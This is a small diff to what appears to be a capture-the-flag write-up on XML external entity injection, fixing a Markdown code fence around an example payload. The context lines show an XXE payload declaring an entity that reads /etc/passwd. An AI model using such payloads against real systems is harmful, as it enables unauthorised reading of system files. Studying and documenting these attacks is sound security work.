@@ -119,7 +119,7 @@ So we have control of the `version` and the `username` field. To perform a XXE w
 
 This is the document we want to be generated:
 
-``xml
+```xml
 <!-- API Version 1.33.7 -->
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <!-- Pwned -->
